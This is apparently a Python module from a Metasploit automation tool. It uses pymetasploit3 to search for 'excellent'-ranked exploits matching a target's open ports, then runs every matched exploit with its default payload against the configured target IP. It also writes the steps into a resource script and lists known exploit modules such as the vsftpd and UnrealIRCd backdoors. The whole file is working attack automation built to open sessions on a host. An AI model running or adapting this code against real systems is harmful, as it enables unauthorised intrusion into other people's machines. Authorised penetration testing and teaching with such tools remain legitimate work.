import time
import sys
import json
import os
import pyfiglet
import re

from pymetasploit3.msfrpc import JobManager
from rc_module import generate_resource_script
from base import settings
from base import open_port
from base import exploit_list
from base import exploit_and_port
from modules import post_exploit_manage

# excellentExplotis = []
excellentExplotis = ['unix/ftp/vsftpd_234_backdoor','windows/fileformat/activepdf_webgrabber','unix/irc/unreal_ircd_3281_backdoor', 'windows/fileformat/djvu_imageurl', 'windows/fileformat/mcafee_hercules_deletesnapshot', 'windows/fileformat/msworks_wkspictureinterface', 'windows/fileformat/sascam_get', 'windows/smb/ms04_007_killbill', 'windows/ftp/sami_ftpd_list','unix/misc/spamassassin_exec']
greatExploits = []
goodExploits = []
normalExploits = []
averageExploits = []
lowExploits = []
manualExplots = []
rc_commands = []
exploitlist = []


def main():
    print('exploit module')
# This line runs the main function
if __name__ == "__main__":
    main()
def exploit(client):
    jobs = JobManager(client)
    # exploitlist = client.modules.exploits
    # exploitlist = []
    print_banner("EXPLOIT MODULE","slant")
    while True:
        # print(pyfiglet.figlet_format(text = "EXPLOIT MODULE",font = "slant"))
        print('press [1] to show current exploit list')
        print('press [2] to search exploit with open port')
        print('press [3] to run all exploit in exploit list')
        print('press [4] for sessions/jobs management')
        print('press [5] to generate resource script')
        print('press [0] to go back')
        command = input('Input Exploit Command Here: ')
        if (command == '1'):
            # 1 show current exploit list
            os.system('cls' if os.name == 'nt' else 'clear')
            show_exploit_list()
            print_banner("EXPLOIT MODULE","slant")
        elif (command == '2'):
            # 2 extract exploit
            os.system('cls' if os.name == 'nt' else 'clear') 
            # print(open_port)
            exploit_search(client)
            print_banner("EXPLOIT MODULE","slant")
            print(f'Port\t\tExploit')
            for port in exploit_and_port:
                print(f'{port}\t\t{len(exploit_and_port[port])}')
            # exploit_list_extract(client,exploitlist)
        elif (command == '3'):
            # 3 run exploit
            os.system('cls' if os.name == 'nt' else 'clear')
            execute_exploit(client,jobs)
        elif (command == '4'):
            # 4 check jobs
            os.system('cls' if os.name == 'nt' else 'clear')
            post_exploit_manage.terminal(client,jobs)
            print_banner("EXPLOIT MODULE","slant")
            # print(f'{len(jobs.list)} job(s) running' )
            # print(jobs.list)
        elif command == '5':
            # 8 generate .rc file 
            print_banner("EXPLOIT MODULE","slant")
            print('generating rc file...')
            generate_resource_script(rc_commands)
            print('Generate Complete..')
        elif command == '0':
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        else:
            print_banner("EXPLOIT MODULE","slant")
            print('Error: Command Not Found..')

def execute_exploit(client,jobs):
    ip_address = settings['target_ip']
    # rc_commands = []
    rc_commands.append('setg RHOSTS '+ ip_address) # append set global ip in rc file
    rc_commands.append('setg LHOST 127.0.0.1')
    for exploitName in exploit_list:
        count = 1
        exploit = client.modules.use('exploit', exploitName)
        rc_commands.append('use exploit/' + exploitName) # append exploit name
        payloadlist = exploit.targetpayloads()
        print(exploitName + ' ' + payloadlist[0])
        payload = client.modules.use('payload', payloadlist[0])
        rc_commands.append('set PAYLOAD ' + payloadlist[0]) # apppend payload name in rc_command
        # add rhost for exploit that require rhost
        if(exploit.missing_required.count('RHOSTS') == 1):
            # print(exploitName)
            exploit['RHOSTS'] = ip_address
        
        try:
            # current_job = exploit.execute(payload = payloadlist[0])
            cid = client.consoles.console().cid
            console = client.consoles.console(cid)
            print(console.run_module_with_output(exploit, payload=payload,run_as_job=True))
            while(console.is_busy()):
                wait_jobs()
            rc_commands.append('run -j')
            # while str(current_job['job_id']) in jobs.list.keys() : # wating till the current job in done processing or exceed time limit
            #     wait_jobs()
            #     if(count >= int(settings['TTL'])):
            #         print('\nThis exploit take too long exit now...')
            #         # jj['jobid']
            #         jobs.stop(current_job['job_id'])
            #         break
            #     count += 1
            console.destroy()
            print('Exploit Done\n')
            # if(current_job['job_id'] != None):
            #     print('Exploit Done\n')
        except Exception as e:
            print(e)
            print("An exception occurred")
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner("EXPLOIT MODULE","slant")
            break

    print( f'{len(client.sessions.list)} Sessions avaiables ')
    # for s in client.sessions.list.keys():
    #     print(s)
        
    # print(json.dumps(client.sessions.list,indent=4,sort_keys=True))

def exploit_list_extract(client,exploitlist):
    for exploit in exploitlist:
        rank = client.modules.use('exploit',exploit).rank
        if(rank == 'excellent'): # Excellent modules
            excellentExplotis.append(exploit)
        elif(rank == 'great'): # great modules
            greatExploits.append(exploit)
        elif(rank == 400): # good modules
            goodExploits.append(exploit)
        elif(rank == 300): # normal modules
            normalExploits.append(exploit)
        elif(rank == 200): # average modules
            averageExploits.append(exploit)
        elif(rank == 100): # low modules
            lowExploits.append(exploit)
        else:
            manualExplots.append(exploit)

def exploit_search(client):
    # exploit_list = []
    for port in open_port:
        # print(port)
        searched_exploit = []
        try:
            cid = client.consoles.console().cid
            console = client.consoles.console(cid)
            console.write(f'search rank:excellent type:exploit port:{port}')
            output = client.consoles.console(cid).read()['data']
            console.destroy()
            # Extract the module name and rank using regular expressions
            pattern = r'\d+\s+exploit/(\S+)\s+\d{4}-\d{2}-\d{2}\s+(\w+)\s+'
            matches = re.findall(pattern, output)
            count = 1
            # Put the exploit to exploit list
            for match in matches:
                # Loading animation
                ############################ 
                print(f'Searching Exploit' + ('.' * count))
                time.sleep(0.1)
                os.system('cls' if os.name == 'nt' else 'clear')
                if count >= 5:
                    count = 0
                count += 1
                
                ##############################
                # print(match)
                exploit_list.append(match[0]) #exploit list for execute
                searched_exploit.append(match[0]) # use for showing exploit 
                # exploit_and_port.append({'name':match[0],
                #                         'port:':port})
            exploit_and_port[port] = searched_exploit
        except KeyboardInterrupt:
            break
    # print(exploit_list)
    

def show_exploit_list():
    print(pyfiglet.figlet_format(text = "Current Exploit",font = "slant"))
    while True:
        try:
            print(f'Port\t\tExploit')
            for port in exploit_and_port:
                print(f'{port}\t\t{len(exploit_and_port[port])}')
            command = input('Input Port to see exploit: ')
            if command in exploit_and_port:
                os.system('cls' if os.name == 'nt' else 'clear')
                print_banner("Current Exploit","slant")
                for exploit in exploit_and_port[command]:
                    print(exploit)
                print('')
            else:
                os.system('cls' if os.name == 'nt' else 'clear')
                print_banner("Current Exploit","slant")
                print('Invalid Port Number')
        
        except KeyboardInterrupt:
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        
    
def print_banner(text,font):
    print(pyfiglet.figlet_format(text,font))

def wait_jobs():
    # for i in range(5):
    #     print(".", end="", flush=True)
    #     time.sleep(1)
    # os.system('cls' if os.name == 'nt' else 'clear')
    for i in progressbar(range(15), "Running an Exploit: ", 40):
        time.sleep(0.1)

def progressbar(it, prefix="", size=60, out=sys.stdout): # Python3.3+
    count = len(it)
    def show(j):
        x = int(size*j/count)
        print("{}[{}{}] ".format(prefix, "#"*x, "."*(size-x)), 
                end='\r', file=out, flush=True)
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
    # print("\n", flush=True, file=out)
